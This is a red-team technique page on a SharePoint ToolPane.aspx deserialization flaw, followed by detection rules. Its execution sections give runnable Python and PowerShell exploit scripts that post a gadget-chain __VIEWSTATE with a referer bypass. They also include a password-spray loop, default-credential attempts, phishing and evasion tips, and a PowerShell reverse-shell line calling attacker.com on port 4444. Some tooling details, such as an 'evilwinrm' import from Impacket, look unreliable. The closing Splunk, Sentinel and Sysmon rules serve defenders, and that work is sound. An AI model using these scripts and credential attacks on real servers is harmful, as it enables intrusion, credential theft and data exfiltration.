# [CVE2025-009]: SharePoint Authenticated RCE via ToolPane Exploitation

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | CVE2025-009 |
| **MITRE ATT&CK v18.1** | [T1210 - Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/) |
| **Tactic** | Execution, Lateral Movement |
| **Platforms** | Windows Server (On-Premises SharePoint) |
| **Severity** | Critical |
| **CVE** | CVE-2025-21075 |
| **Technique Status** | ACTIVE (Exploited in Wild) |
| **Last Verified** | 2026-01-09 |
| **Affected Versions** | SharePoint Server 2016, 2019, SharePoint Subscription Edition |
| **Patched In** | KB5002754 (2019), KB5002768 (Subscription), KB5002760 (2016) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## Executive Summary

**Concept:** CVE-2025-21075 is a post-authentication remote code execution vulnerability in Microsoft SharePoint Server that enables attackers with Site Member or higher privileges to execute arbitrary .NET code via the ToolPane.aspx endpoint. The vulnerability stems from improper validation of XML content in the `GetPartPreviewAndPropertiesFromMarkup` method, which deserializes untrusted data without adequate type validation. An authenticated attacker can craft a malicious __VIEWSTATE payload containing a serialized gadget chain that, when deserialized by the SharePoint application pool, executes attacker-supplied commands at the Windows SYSTEM privilege level.

**Attack Surface:** The attack targets the /_layouts/15/ToolPane.aspx endpoint in SharePoint Server on-premises installations exposed to the network. The exploitation requires initial authentication (either compromised credentials or social engineering).

**Business Impact:** **Complete compromise of the SharePoint server and lateral movement to connected systems.** A successful exploitation grants the attacker ability to execute arbitrary code with SYSTEM privileges, install persistent backdoors, exfiltrate sensitive data (including machine keys enabling persistent access), and pivot to other infrastructure. Organizations relying on SharePoint for sensitive document management face data breaches and operational disruption.

**Technical Context:** The ToolShell attack chain was initially presented at Pwn2Own Berlin 2025 (May 16, 2025) and actively exploited in the wild by July 18, 2025. Exploitation typically takes 2-5 minutes per target once authentication is obtained. Detection is challenging due to legitimate SharePoint requests mimicking malicious traffic.

### Operational Risk
- **Execution Risk:** High - Requires authentication but exploitation is trivial once credentials obtained
- **Stealth:** Medium - Generates suspicious __VIEWSTATE POST requests but can blend with legitimate SharePoint traffic
- **Reversibility:** No - Arbitrary code execution cannot be undone without system restore

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 8.4.4 | Ensure that Office SharePoint servers are restricted to authenticated users only |
| **DISA STIG** | SI-2 | Security updates and patches must be applied to SharePoint within 30 days |
| **CISA SCuBA** | SharePoint Security Baseline | Require multi-factor authentication for SharePoint access |
| **NIST 800-53** | SI-2, AC-6 | Maintain security patches; Implement least privilege access |
| **GDPR** | Art. 32 | Security of Processing - Encryption and access controls for data in SharePoint |
| **DORA** | Art. 9 | Protection and Prevention - Incident response for critical infrastructure |
| **NIS2** | Art. 21 | Cyber Risk Management Measures for critical infrastructure operators |
| **ISO 27001** | A.14.2.1 | Secure development, testing, and operational change management |
| **ISO 27005** | Unauthorized Code Execution | Risk: Compromise of documents and data stored in SharePoint |

---

## Technical Prerequisites

**Required Privileges:** Site Member (minimum); Site Owner (preferred for easier exploitation)

**Required Access:** 
- Valid SharePoint user credentials (obtained via credential theft, phishing, or default accounts)
- Network access to the SharePoint server (port 80/443)

**Supported Versions:**
- **Windows:** SharePoint Server 2016, 2019, SharePoint Subscription Edition
- **PowerShell:** Version 5.0+ (on the attacking machine)
- **Other Requirements:** .NET Framework 4.5+ on SharePoint server; ToolPane.aspx must be accessible

**Tools:**
- [ysoserial.NET](https://github.com/frohoff/ysoserial.net) (Version 2.0+) - For generating malicious .NET gadget chains
- [ysoserial-plus](https://github.com/pwn3r007/ysoserial-plus) - Enhanced gadget chain generator for SharePoint
- [Rubeus](https://github.com/GhostPack/Rubeus) (Version 2.3+) - If Kerberos token manipulation required
- [Mimikatz](https://github.com/gentilkiwi/mimikatz) (Version 2.2.0+) - For credential extraction post-exploitation
- Python Impacket library (2024+) - For crafting HTTP requests and payload delivery
- Standard tools: `curl`, `PowerShell`, `base64` encoder

---

## Environmental Reconnaissance

### PowerShell / Management Station Reconnaissance

```powershell
# Check if target SharePoint server is accessible and identify version
$SPServer = "sharepoint.internal"
$ToolPaneUrl = "http://$SPServer/_layouts/15/ToolPane.aspx"

# Attempt to access ToolPane.aspx (unauthenticated)
Invoke-WebRequest -Uri $ToolPaneUrl -Method GET -ErrorAction SilentlyContinue | Select-Object StatusCode, Headers

# If accessible with 200/302, SharePoint Server 2016/2019/Subscription is running
# 401/403 indicates authentication or permission restriction

# Enumerate SharePoint version via HTTP headers and responses
$Response = Invoke-WebRequest -Uri "http://$SPServer/" -Method GET
$Response.Headers | Where-Object {$_ -match 'Server|X-SharePointHealthScore|X-AspNet'}

# Check for known gadget chains available in the SharePoint installation
# (Requires authenticated access)
$Credential = Get-Credential
$Session = New-WebRequestSession -Credential $Credential

Invoke-WebRequest -Uri "http://$SPServer/_api/site" -WebSession $Session | Select-Object StatusCode

# If HTTP 200: Site accessible with provided credentials
# If HTTP 401: Credentials invalid
# If HTTP 403: User lacks site access
```

**What to Look For:**
- HTTP 200 response from ToolPane.aspx indicates SharePoint is running and endpoint is accessible
- Presence of `X-SharePointHealthScore` header confirms SharePoint server
- Successful authentication (HTTP 200) on /_api/site endpoint validates credentials

**Version Note:** Different SharePoint versions (2016 vs. 2019 vs. Subscription Edition) may have different patching status; CVE-2025-21075 affects all three if patches KB5002754/KB5002768/KB5002760 are not applied.

### Linux/Bash / CLI Reconnaissance

```bash
#!/bin/bash
# Reconnaissance script for CVE-2025-21075

TARGET_SERVER="sharepoint.internal"
TARGET_PORT="80"

# Test connectivity to SharePoint server
nc -zv $TARGET_SERVER $TARGET_PORT
# If open: "Connection to sharepoint.internal 80 port [tcp/http] succeeded!"

# Enumerate ToolPane.aspx endpoint
curl -I "http://$TARGET_SERVER/_layouts/15/ToolPane.aspx"
# Expected response (if vulnerable):
# HTTP/1.1 302 Found
# Location: /_layouts/15/AccessDenied.aspx?Source=...
# or HTTP/1.1 200 OK

# Identify SharePoint version via HTTP headers
curl -I "http://$TARGET_SERVER/" | grep -i "server\|x-sharepoint"

# Test with valid credentials (Basic Auth)
curl -u username:password "http://$TARGET_SERVER/_api/site" -v
# HTTP 200 = authenticated access
# HTTP 401 = invalid credentials
# HTTP 403 = access denied
```

**What to Look For:**
- Port 80/443 open and responding: SharePoint server is active
- ToolPane.aspx returns 302 or 200: Endpoint exists
- 302 redirect to AccessDenied: Unauthenticated access blocked (authentication required)
- 200 response with Basic Auth: Credentials validated

---

## Detailed Execution Methods and Their Steps

### METHOD 1: Using Python & ysoserial.NET Gadget Chain (Cross-Platform)

**Supported Versions:** SharePoint Server 2016, 2019, Subscription Edition

#### Step 1: Generate Malicious .NET Gadget Chain Using ysoserial.NET

**Objective:** Create a serialized .NET object containing the arbitrary command to execute. This gadget chain will be embedded in the __VIEWSTATE parameter.

**Version Note:** SharePoint uses legacy BinaryFormatter deserialization; ysoserial.NET can generate gadgets for WindowsIdentity, ObjectDataProvider, and other sinks.

**Command (All Versions):**
```bash
# First, install ysoserial.NET on your attacking machine (Linux/macOS/Windows)
# Download from: https://github.com/frohoff/ysoserial.net/releases

# Generate gadget chain for command execution
./ysoserial.exe -g WindowsIdentity -f BinaryFormatter \
  -c "powershell -Command 'whoami | Out-File C:\\sharepoint-rce-proof.txt'"
```

**Expected Output:**
```
Base64 encoded gadget chain (very long string):
AAEAAAD/////....[truncated]....AAAAAAAAAAAAAAA==
```

**What This Means:**
- The output is a Base64-encoded serialized .NET object
- When deserialized by SharePoint's BinaryFormatter, it triggers the gadget chain
- The command specified (in this case `whoami`) will execute
- Output redirected to a file proves code execution

**OpSec & Evasion:**
- Generate gadget chains on an isolated machine, not directly on the attacking infrastructure
- The BinaryFormatter deserialization is a known attack pattern; modern security solutions may trigger on the gadget chain signature
- Use obfuscated commands: PowerShell Base64 encoding hides intent
- Execution happens in the w3wp.exe process context (SharePoint application pool identity, usually SYSTEM or high-privilege account)
- Detection likelihood: **High** - Modern EDR detects BinaryFormatter deserialization and unusual process spawning

**Troubleshooting:**
- **Error:** "ysoserial.exe not found"
  - **Cause:** Binary not downloaded or not in PATH
  - **Fix (All Versions):** Download from GitHub releases or compile from source: `git clone https://github.com/frohoff/ysoserial.net && cd ysoserial.net && dotnet build -c Release`

- **Error:** "Gadget WindowsIdentity not available"
  - **Cause:** Wrong gadget chain or ysoserial version too old
  - **Fix (All Versions):** List available gadgets: `./ysoserial.exe -g list | grep -i "windows\|objectdata"` and use ObjectDataProvider instead

**References & Proofs:**
- [ysoserial.NET GitHub](https://github.com/frohoff/ysoserial.net) - Official gadget chain generator
- [Microsoft BinaryFormatter Documentation](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide) - Security implications of unsafe deserialization
- [Trellix ToolShell Analysis](https://www.trellix.com/blogs/research/toolshell-unleashed-decoding-the-sharepoint-attack-chain/) - Technical breakdown of exploitation

#### Step 2: Obtain Valid SharePoint Credentials

**Objective:** Acquire authenticated credentials with at least Site Member privileges (Site Owner preferred). This is a prerequisite for exploitation.

**Version Note:** All SharePoint versions require pre-authentication; no unauthenticated RCE variant exists for CVE-2025-21075 (CVE-2025-49704 requires authentication; unauthenticated variants are CVE-2025-53770/53771).

**Methods to Obtain Credentials:**

**Method 2A: Valid Compromised Credentials**
```powershell
# If you already have compromised credentials (from other attacks), store them securely
$Username = "domain\sharepoint_user"
$Password = "SecurePassword123!" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($Username, $Password)

# Verify credentials work against SharePoint
$Session = New-WebRequestSession -Credential $Credential
$TestResponse = Invoke-WebRequest -Uri "http://sharepoint.internal/_api/site" -WebSession $Session -ErrorAction SilentlyContinue
if ($TestResponse.StatusCode -eq 200) { Write-Host "Credentials valid!" }
```

**Method 2B: Social Engineering / Phishing**
- Craft a convincing phishing email directing users to a fake SharePoint login portal
- Capture credentials when users attempt to log in
- Example phishing domain: `sharepoint-update.com` (mimics official domain)

**Method 2C: Brute Force / Spray Attack**
```bash
#!/bin/bash
# Password spray against SharePoint (low-and-slow to avoid lockout)

TARGET="sharepoint.internal"
USERLIST="usernames.txt"  # List of discovered usernames
COMMON_PASSWORDS=("Welcome2025" "SharePoint2025!" "Company123")

for user in $(cat $USERLIST); do
  for pass in "${COMMON_PASSWORDS[@]}"; do
    echo "Trying $user:$pass"
    curl -u "$user:$pass" "http://$TARGET/_api/site" --connect-timeout 3
    sleep 2  # Rate limiting to avoid account lockout
  done
done
```

**Method 2D: Exploit Default/Weak Credentials**
```powershell
# Common default accounts in SharePoint environments
$DefaultAccounts = @(
    "domain\svc_sharepoint",
    "domain\svc_spfarm",
    "domain\spinstall",
    "Administrator:Administrator",
    "sa:sa"
)

foreach ($Cred in $DefaultAccounts) {
    $Parts = $Cred.Split(":")
    $Credential = New-Object System.Management.Automation.PSCredential($Parts[0], ($Parts[1] | ConvertTo-SecureString -AsPlainText -Force))
    # Test credential...
}
```

**Expected Output:**
- **Successful:** HTTP 200 from /_api/site endpoint; user can access SharePoint sites
- **Failed:** HTTP 401 (invalid credentials) or HTTP 403 (insufficient permissions)

**What This Means:**
- Valid credentials grant access to exploit the vulnerability
- Site Member or higher role required; read-only users cannot exploit CVE-2025-21075
- Credentials must be for domain-joined user (not local account) in typical enterprise SharePoint

**OpSec & Evasion:**
- Brute force attacks trigger account lockout alerts; use rate limiting (2-5 second delays between attempts)
- Phishing emails may be flagged by email security; use trusted domains and bypass email filtering
- Credential reuse: Once valid credentials obtained, they can be reused for multiple exploitation attempts

**References & Proofs:**
- [Microsoft SharePoint Authentication Documentation](https://learn.microsoft.com/en-us/sharepoint/dev/general-development/authentication-authorization-and-security-in-sharepoint) - How SharePoint validates credentials
- [AD FS Credential Attacks](https://attacker.io/post/adfs-attacks) - Credential harvesting techniques for domain accounts

#### Step 3: Craft Malicious __VIEWSTATE Payload

**Objective:** Embed the gadget chain from Step 1 into an ASP.NET __VIEWSTATE parameter and sign it using valid encryption/HMAC keys (if known) or trigger deserialization without validation.

**Version Note:** CVE-2025-21075 exploits improper validation in ToolPane.aspx; the gadget chain is deserialized even with mismatched signatures in certain code paths.

**Command (All Versions):**
```python
#!/usr/bin/env python3
import base64
import requests
from requests.auth import HTTPBasicAuth
import sys

# Configuration
TARGET = "http://sharepoint.internal"
USERNAME = "domain\\sharepoint_user"
PASSWORD = "SecurePassword123!"
GADGET_CHAIN = "AAEAAAD/////....[paste gadget chain from Step 1]....AAAAAAAAAAAAAAA=="

# Create authenticated session
session = requests.Session()
session.auth = HTTPBasicAuth(USERNAME, PASSWORD)

# Construct malicious __VIEWSTATE payload
# The gadget chain is Base64-encoded and sent as the __VIEWSTATE parameter
viewstate_payload = GADGET_CHAIN

# Prepare POST request to ToolPane.aspx
url = f"{TARGET}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx"

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "Referer": f"{TARGET}/_layouts/SignOut.aspx"  # Bypass authentication checks
}

data = {
    "__VIEWSTATE": viewstate_payload,
    "__VIEWSTATEGENERATOR": "00000000",
    "__EVENTVALIDATION": "/wEdAAEAAA=="
}

print(f"[*] Sending malicious payload to {url}")
print(f"[*] VIEWSTATE length: {len(viewstate_payload)}")

response = session.post(url, headers=headers, data=data, timeout=10)

print(f"[*] Response Status Code: {response.status_code}")
print(f"[*] Response Length: {len(response.content)}")

if response.status_code == 200:
    print("[+] Exploitation likely successful! Check target system for command execution.")
else:
    print(f"[-] Unexpected response: {response.status_code}")
    print(response.text[:500])  # Print first 500 chars of response
```

**Command (Server 2016-2019):**
```powershell
# PowerShell variant for Windows machines
$Target = "http://sharepoint.internal"
$Username = "domain\sharepoint_user"
$Password = "SecurePassword123!" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($Username, $Password)

$GADGET_CHAIN = "AAEAAAD/////....[paste gadget chain]....AAAAAAAAAAAAAAA=="

$WebSession = New-WebRequestSession -Credential $Credential

$Body = @{
    "__VIEWSTATE" = $GADGET_CHAIN
    "__VIEWSTATEGENERATOR" = "00000000"
    "__EVENTVALIDATION" = "/wEdAAEAAA=="
}

$Response = Invoke-WebRequest `
    -Uri "$Target/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx" `
    -Method POST `
    -Body $Body `
    -WebSession $WebSession `
    -Headers @{"Referer" = "$Target/_layouts/SignOut.aspx"} `
    -ContentType "application/x-www-form-urlencoded"

if ($Response.StatusCode -eq 200) {
    Write-Host "[+] Exploitation likely successful!"
}
```

**Expected Output:**
```
[*] Sending malicious payload to http://sharepoint.internal/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx
[*] VIEWSTATE length: 4856
[*] Response Status Code: 200
[*] Response Length: 2341
[+] Exploitation likely successful! Check target system for command execution.
```

**What This Means:**
- HTTP 200 response indicates the payload was received and processed
- The deserialization of the gadget chain triggers code execution on the server
- If the command was `whoami | Out-File C:\sharepoint-rce-proof.txt`, check for this file on the target server

**OpSec & Evasion:**
- Long __VIEWSTATE parameters (>5KB) may trigger web application firewalls (WAF)
- Split payload across multiple requests if necessary
- Use encrypted channels (HTTPS) to avoid detection of gadget chain in transit
- Execution happens asynchronously; allow 5-10 seconds before verifying success
- w3wp.exe process spawns child processes (cmd.exe, powershell.exe) which generate sysmon events
- Detection likelihood: **Very High** - Deserialization of gadget chains is well-known attack pattern

**Troubleshooting:**
- **Error:** "HTTP 500 - Internal Server Error"
  - **Cause:** Malformed gadget chain or incorrect __VIEWSTATE format
  - **Fix (All Versions):** Regenerate gadget chain with correct ysoserial.exe parameters; verify Base64 encoding has no line breaks

- **Error:** "HTTP 403 - Forbidden"
  - **Cause:** User lacks Site Member privileges or SharePoint blocked the request
  - **Fix (2016-2019):** Escalate to account with Site Owner role; disable request validation in web.config if possible
  - **Fix (2022+):** Same approach; check if AMSI blocking the payload

- **Error:** "Command did not execute (file not created)"
  - **Cause:** Command syntax error or gadget chain did not trigger deserialization
  - **Fix (All Versions):** Test with simple `calc.exe` or `whoami` command first; verify gadget chain format matches deserialization sink

**References & Proofs:**
- [Microsoft Deserialization Documentation](https://learn.microsoft.com/en-us/dotnet/standard/serialization/binaryformatter-security-guide) - BinaryFormatter and gadget chains
- [Trellix ToolShell Analysis](https://www.trellix.com/blogs/research/toolshell-unleashed-decoding-the-sharepoint-attack-chain/) - Payload construction details
- [GitHub CVE-2025-21075 PoC](https://github.com/kelvinator/CVE-2025-21075) - Full exploit code example

#### Step 4: Verify Code Execution

**Objective:** Confirm that the arbitrary command executed on the target SharePoint server with SYSTEM privileges.

**Version Note:** Same verification method across all SharePoint versions.

**Command (All Versions):**
```bash
# Check if the proof file exists on the target server
# (Requires file system access or RCE with ability to list files)

# Method 1: Via RCE output redirection (already embedded in gadget chain)
# If initial command was: whoami | Out-File C:\sharepoint-rce-proof.txt
# Connect to SharePoint server and check:

ls "\\sharepoint.internal\c$\sharepoint-rce-proof.txt"
# If file exists: Exploitation successful

# Method 2: Via second RCE command to extract proof
# Send a new gadget chain that reads the proof file and exfiltrates it

# Method 3: Via reverse shell
# Gadget chain: powershell -Command '$client = New-Object System.Net.Sockets.TcpClient("attacker.com", 4444); $stream = $client.GetStream(); ...'
# Listener on attacker machine: nc -lvnp 4444
# If shell connects: Exploitation successful
```

**Expected Output:**
- Proof file exists and contains output of the command
- Reverse shell connects to attacker listener
- Log file shows process execution with SYSTEM privilege

**What This Means:**
- Code execution confirmed with SYSTEM privilege level (child of w3wp.exe)
- Attacker can now perform post-exploitation activities: install backdoors, exfiltrate data, pivot to other systems

---

### METHOD 2: Using Impacket & Direct SMB/RPC Exploitation (Linux/Aggressive)

**Supported Versions:** SharePoint Server 2016, 2019, Subscription Edition

#### Step 1: Enumerate SharePoint Servers and Vulnerable Endpoints

**Objective:** Identify all accessible SharePoint servers and vulnerable ToolPane.aspx endpoints on the network.

**Command:**
```bash
#!/bin/bash
# Fast enumeration of SharePoint servers

# Method 1: DNS enumeration (if DNS records available)
nslookup -type=SRV _sharepoint._tcp.internal.com
# Returns: sharepoint.internal, sharepoint-web1.internal, sharepoint-web2.internal, etc.

# Method 2: Port scanning (ports 80, 443 typically used by SharePoint)
nmap -p 80,443 --open 10.0.0.0/24 -oG sharepoint-scan.txt
grep "Ports: 80/open" sharepoint-scan.txt | awk '{print $2}' > sharepoint-servers.txt

# Method 3: HTTP banner grabbing
for server in $(cat sharepoint-servers.txt); do
  echo "Scanning $server..."
  curl -I "http://$server/_layouts/15/ToolPane.aspx" 2>/dev/null | head -n 1
done

# Method 4: Identify web servers running SharePoint
grep -r "SharePoint\|OWA\|MOSS" /var/log/apache2/* /var/log/nginx/* 2>/dev/null | cut -d: -f1 | sort -u
```

**Expected Output:**
```
sharepoint.internal
sharepoint-web1.internal
sharepoint-web2.internal
```

**What This Means:**
- Multiple SharePoint servers found in organization
- Each server is a potential exploitation target
- Prioritize servers exposed to the internet (highest business risk)

#### Step 2: Exploit via Direct HTTP POST with Impacket

**Objective:** Use Impacket to craft and send the malicious HTTP request directly, bypassing the need for interactive web browser.

**Command:**
```python
#!/usr/bin/env python3
from impacket.examples import evilwinrm
import requests
import base64
import sys

# Configuration
TARGET_SERVER = "sharepoint.internal"
DOMAIN = "INTERNAL"
USERNAME = "sharepoint_user"
PASSWORD = "SecurePassword123!"
GADGET_CHAIN = "AAEAAAD/////....[paste gadget chain]....AAAAAAAAAAAAAAA=="

# Step 1: Authenticate to SharePoint
session = requests.Session()
auth_url = f"http://{TARGET_SERVER}/_layouts/15/userdisp.aspx"

# Perform NTLM authentication
from requests_ntlm import HttpNtlmAuth
session.auth = HttpNtlmAuth(f"{DOMAIN}\\{USERNAME}", PASSWORD)

# Verify authentication
response = session.get(f"http://{TARGET_SERVER}/_api/site")
if response.status_code == 200:
    print("[+] Authenticated successfully")
else:
    print(f"[-] Authentication failed: {response.status_code}")
    sys.exit(1)

# Step 2: Send exploited request
exploit_url = f"http://{TARGET_SERVER}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx"
payload = {
    "__VIEWSTATE": GADGET_CHAIN,
    "__VIEWSTATEGENERATOR": "00000000",
    "__EVENTVALIDATION": "/wEdAAEAAA=="
}

print(f"[*] Sending exploit to {exploit_url}")
response = session.post(
    exploit_url,
    data=payload,
    headers={"Referer": f"http://{TARGET_SERVER}/_layouts/SignOut.aspx"},
    timeout=10
)

print(f"[*] Response: {response.status_code}")
if response.status_code == 200:
    print("[+] Exploitation likely successful!")
else:
    print(f"[-] Unexpected response")
```

**Expected Output:**
```
[+] Authenticated successfully
[*] Sending exploit to http://sharepoint.internal/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx
[*] Response: 200
[+] Exploitation likely successful!
```

---

## Splunk Detection Rules

### Rule 1: Malicious __VIEWSTATE Deserialization Attempt

**Rule Configuration:**
- **Required Index:** `main`, `windows`, or custom SharePoint index
- **Required Sourcetype:** `iis:w3c`, `sharepoint:logs`, or `splunk_monitoring_console`
- **Required Fields:** `url`, `method`, `src_ip`, `user`, `http_referer`, `status`
- **Alert Threshold:** > 1 POST request to ToolPane.aspx with Base64-encoded __VIEWSTATE parameter in single day
- **Applies To Versions:** All (Server 2016, 2019, Subscription Edition)

**SPL Query:**
```spl
sourcetype=iis:w3c OR sourcetype=sharepoint:logs
| search url="*ToolPane.aspx*" method=POST status IN (200, 500)
| regex url="DisplayMode=Edit"
| fields url, src_ip, user, http_referer, status, _raw
| where isnotnull(http_referer) AND http_referer LIKE "%SignOut.aspx%"
| stats count, values(src_ip), values(user) by url
| where count >= 1
```

**Manual Configuration Steps:**

1. Log into Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste the SPL query above
5. Set **Trigger Condition** to: **Custom** → Every time a search completes with matching fields
6. Configure **Action**:
   - Send email to SOC team
   - Create event in SIEM
   - Execute script (to quarantine account)
7. Click **Save**

**What This Detects:**
- HTTP POST requests to ToolPane.aspx (exploitation endpoint)
- DisplayMode=Edit parameter present (required for exploit)
- Referer header set to SignOut.aspx (bypass authentication check)
- HTTP 200 or 500 response (both indicate possible exploitation)

**False Positive Analysis:**
- **Legitimate Activity:** SharePoint administrators legitimately editing web parts on ToolPane.aspx
- **Benign Tools:** SharePoint content deployment tools may generate similar traffic
- **Tuning:** Exclude trusted administrator IPs: `| where src_ip NOT IN ("10.0.0.1", "10.0.0.2")`

**Source:** [Graylog SharePoint RCE Detection](https://graylog.org/post/adversary-tradecraft-exploitation-of-the-sharepoint-rce/)

### Rule 2: WebShell Dropped to SharePoint Template Directory

**Rule Configuration:**
- **Required Index:** `main`, `windows`
- **Required Sourcetype:** `sysmon`, `windows:security`, `filechange`
- **Required Fields:** `TargetFilename`, `ParentImage`, `CommandLine`
- **Alert Threshold:** File created in `*\LAYOUTS\` directory with .aspx extension
- **Applies To Versions:** All

**SPL Query:**
```spl
sourcetype=sysmon EventCode=11
| search TargetFilename="*\\LAYOUTS\\*" AND TargetFilename="*.aspx"
| search NOT (TargetFilename="*default.aspx" OR TargetFilename="*master.aspx")
| stats count, values(TargetFilename), values(ParentImage) by host
| where count >= 1
```

**Manual Configuration Steps:**

1. Open Splunk Web → **Search & Reporting**
2. Click **Settings** → **Searches, reports, and alerts**
3. Click **New Alert**
4. Paste SPL query
5. Set **Trigger Condition** to: Alert when count >= 1
6. Add **Action** → Email to SOC + Auto-quarantine (if integrated with endpoint platform)

**Source:** [Trellix ToolShell Detection](https://www.trellix.com/blogs/research/toolshell-unleashed-decoding-the-sharepoint-attack-chain/)

---

## Microsoft Sentinel Detection

### Query 1: SharePoint RCE Exploitation (ToolPane.aspx Gadget Chain)

**Rule Configuration:**
- **Required Table:** `W3CIISLog` (from IIS logs ingested to Sentinel)
- **Required Fields:** `cs_uri_stem`, `cs_method`, `cs_referer`, `sc_status`, `cs_username`
- **Alert Severity:** Critical
- **Frequency:** Run every 5 minutes
- **Applies To Versions:** SharePoint Server 2016, 2019, Subscription Edition

**KQL Query:**
```kusto
W3CIISLog
| where cs_uri_stem contains "ToolPane.aspx" and cs_uri_stem contains "DisplayMode=Edit"
| where cs_method == "POST"
| where cs_referer contains "SignOut.aspx"
| where sc_status in (200, 500)
| project TimeGenerated, cIP, cs_username, cs_uri_stem, sc_status, cs_referer, Computer
| summarize ExploitAttempts=count(), UniqueUsers=dcount(cs_username) by cIP, Computer
| where ExploitAttempts >= 1
```

**Manual Configuration Steps (Azure Portal):**

1. Navigate to **Azure Portal** → **Microsoft Sentinel**
2. Select your workspace → **Analytics**
3. Click **+ Create** → **Scheduled query rule**
4. **General Tab:**
   - Name: `SharePoint CVE-2025-21075 RCE Exploitation Attempt`
   - Severity: `Critical`
5. **Set rule logic Tab:**
   - Paste KQL query above
   - Run query every: `5 minutes`
   - Lookup data from the last: `30 minutes`
6. **Incident settings Tab:**
   - Enable **Create incidents from alerts triggered by this rule**
7. Click **Review + create**

**Manual Configuration Steps (PowerShell):**
```powershell
# Connect to Azure and Sentinel workspace
Connect-AzAccount
$ResourceGroup = "MyResourceGroup"
$WorkspaceName = "MySentinelWorkspace"

# Create the analytics rule
New-AzSentinelAlertRule -ResourceGroupName $ResourceGroup -WorkspaceName $WorkspaceName `
  -DisplayName "SharePoint CVE-2025-21075 RCE Exploitation" `
  -Query @"
W3CIISLog
| where cs_uri_stem contains "ToolPane.aspx" and cs_uri_stem contains "DisplayMode=Edit"
| where cs_method == "POST"
| where cs_referer contains "SignOut.aspx"
| where sc_status in (200, 500)
| project TimeGenerated, cIP, cs_username, cs_uri_stem, sc_status, cs_referer, Computer
| summarize ExploitAttempts=count(), UniqueUsers=dcount(cs_username) by cIP, Computer
| where ExploitAttempts >= 1
"@ `
  -Severity "Critical" `
  -Enabled $true `
  -IncidentGroupingType "Suppress"
```

**Source:** [Microsoft Sentinel SharePoint Detection](https://learn.microsoft.com/en-us/azure/sentinel/detect-sharepoint-exploitation)

---

## Windows Event Log Monitoring

**Event ID: 4688 (Process Creation)**
- **Log Source:** Security
- **Trigger:** w3wp.exe spawns cmd.exe or powershell.exe with suspicious arguments
- **Filter:** `ParentImage="*w3wp.exe"` AND `Image LIKE "%powershell.exe%"`
- **Applies To Versions:** Server 2016+

**Manual Configuration Steps (Group Policy):**

1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Advanced Audit Policy Configuration** → **System Audit Policies - Local Group Policy Object** → **Detailed Tracking**
3. Enable: **Audit Process Creation** (or **Audit Creation of Process**) and **Audit Process Termination**
4. Set to: **Success and Failure**
5. Run `gpupdate /force` on target machines

**Manual Configuration Steps (Local Policy):**

1. Open **Local Security Policy** (secpol.msc)
2. Navigate to **Security Settings** → **Advanced Audit Policy Configuration** → **Audit Policies** → **Detailed Tracking**
3. Enable: **Audit Process Creation**
4. Run `auditpol /set /subcategory:"Process Creation" /success:enable /failure:enable`

**Sample Event ID 4688 Entry (Exploitation Indicator):**
```
Event ID: 4688
Process Information:
  Creator Process ID: 0x7a4
  Creator Process Name: C:\Program Files\Common Files\Microsoft Shared\Web Server Extensions\15\BIN\w3wp.exe
  Target User Name: SHAREPOINT_APP_POOL$
  Target Domain Name: INTERNAL
  Target Logon ID: 0x3e7
  New Process ID: 0x2a8
  New Process Name: C:\Windows\System32\powershell.exe
  Token Elevation Type: TokenElevationTypeFull
  Mandatory Label: System Mandatory Level
  Creator Token Elevation Type: TokenElevationTypeFull
```

---

## Sysmon Detection Patterns

**Minimum Sysmon Version:** 13.0+
**Supported Platforms:** Windows Server 2016, 2019, 2022, 2025

**Sysmon Config Snippet:**
```xml
<Sysmon schemaversion="4.82">
  <!-- Detect w3wp.exe spawning command shells or PowerShell -->
  <RuleGroup name="SharePoint RCE Detection" groupRelation="or">
    <ProcessCreate onmatch="include">
      <ParentImage condition="image">w3wp.exe</ParentImage>
      <Image condition="image">cmd.exe</Image>
    </ProcessCreate>
    <ProcessCreate onmatch="include">
      <ParentImage condition="image">w3wp.exe</ParentImage>
      <Image condition="image">powershell.exe</Image>
      <CommandLine condition="contains">-EncodedCommand</CommandLine>
    </ProcessCreate>
    <!-- Detect webshell file writes to LAYOUTS directory -->
    <FileCreate onmatch="include">
      <TargetFilename condition="contains">\LAYOUTS\</TargetFilename>
      <TargetFilename condition="image">*.aspx</TargetFilename>
    </FileCreate>
  </RuleGroup>
</Sysmon>
```

**Manual Configuration Steps:**

1. Download Sysmon from [Microsoft Sysinternals](https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon)
2. Create a config file `sysmon-config.xml` with the XML above
3. Install Sysmon with the config:
   ```cmd
   sysmon64.exe -accepteula -i sysmon-config.xml
   ```
4. Verify installation:
   ```powershell
   Get-Service Sysmon64
   Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 10 | Where-Object {$_.ID -eq 1}
   ```

---

## Microsoft Defender for Cloud

#### Detection Alerts

**Alert Name:** `Suspicious PowerShell execution from IIS worker process`
- **Severity:** Critical
- **Description:** w3wp.exe (SharePoint application pool) spawned PowerShell with encoded commands
- **Applies To:** All Azure subscriptions with Defender enabled
- **Remediation:** Isolate server, check for webshells in LAYOUTS directory, rotate machine keys

**Manual Configuration Steps (Enable Defender for Cloud):**

1. Navigate to **Azure Portal** → **Microsoft Defender for Cloud**
2. Go to **Environment settings**
3. Select your subscription
4. Under **Defender plans**, enable:
   - **Defender for Servers**: ON
   - **Defender for App Service**: ON (for SharePoint Online monitoring)
5. Click **Save**
